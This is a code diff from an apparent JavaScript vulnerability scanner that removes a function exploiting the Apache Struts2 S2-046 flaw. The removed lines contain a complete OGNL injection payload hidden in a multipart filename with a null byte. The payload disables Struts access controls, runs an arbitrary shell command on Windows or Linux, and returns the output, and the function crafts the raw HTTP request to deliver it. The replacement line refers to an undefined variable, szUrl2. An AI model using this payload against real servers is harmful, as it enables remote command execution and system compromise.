@@ -240,31 +240,7 @@ console.log(k + " = " + this[k])
 // http://192.168.10.216:8082/s2-046/
 function doStruts2_046(url)
 {
-	// 测试证明不能encodeURIComponent编码，filename 后的\0b不能少
-	var s = ("%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())" +
-		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
-		// + ".(#response.addHeader('struts2','_struts2_'))"
-		+ ".(#ros=(#response.getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
-	try{
-		var uO = urlObj.parse(url),host = uO.host.split(/:/)[0], port = uO.port || 80;
-		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
-		
-		// Expect: \r\n
-		var szTmp = '',tNum = new Date().getTime(),
-			boundary = '---------------------------11602011' + tNum,
-			szTmp2 = '--' + boundary + '\r\nContent-Disposition: form-data; name="foo"; filename="' + s + '\0b"\r\nContent-Type: text/plain\r\n\r\nx\r\n--' + boundary + '--\r\n\r\n';
-		fnSocket(host,port,szTmp = 'POST ' + uO.path + '/ HTTP/1.1\r\nHost: ' 
-			+ uO.host + '\r\nContent-Length: ' + (szTmp2.length + 4) + '\r\nUser-Agent: ' + g_szUa + '\r\nContent-Type: multipart/form-data; boundary=' + boundary 
-		+ '\r\nConnection: close\r\n\r\n' + szTmp2,
-			function(data)
-		{
-			var d = (data && data.toString().trim() || "").toString("utf8");
-			// console.log(szTmp)
-			// console.log(d)
-    		fnDoBody(d,"s2-046",url);
-			
-		});
-	}catch(e){fnLog(e);}
+	runChecks(szUrl2,"struts2,046");
 }
 
 
